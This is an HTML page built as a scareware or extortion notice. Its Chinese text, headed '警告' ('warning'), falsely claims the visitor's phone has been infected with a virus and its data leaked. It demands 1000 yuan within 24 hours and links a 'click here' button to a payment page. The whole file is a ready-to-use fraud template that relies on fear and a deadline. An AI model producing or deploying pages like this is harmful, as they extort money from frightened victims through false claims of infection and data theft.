<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width">
    <title>警告</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        body {
            background-color: #f8f8f8;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .center {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .error {
            background-color: #fff;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .error__title {
            font-size: 5rem;
            color: #ff6347;
            margin: 0;
        }
        .error__type {
            font-size: 1.5rem;
            color: #333;
            margin: 10px 0;
        }
        .error__cta {
            font-size: 1rem;
            color: #777;
            margin: 0;
        }
        /* Add more styles or animations as desired */
    </style>
</head>
<body>
    <div class="center">
        <section class="error">
            <h1 class="error__title">警告</h1>
            <h2 class="error__type">您的手机已经被植入病毒且资料已外泄</h2>
            <p class="error__cta">若想解除病毒请在24小时内到此网址支付1000元</p>
			<p><a href="payment.html" style="text-decoration:none">点击此处</a></p>
            <!-- You can add an image or other elements here -->
        </section>
    </div>
    <!-- You can link to additional JavaScript files if needed -->
    <script src="script.js"></script>
</body>
</html>
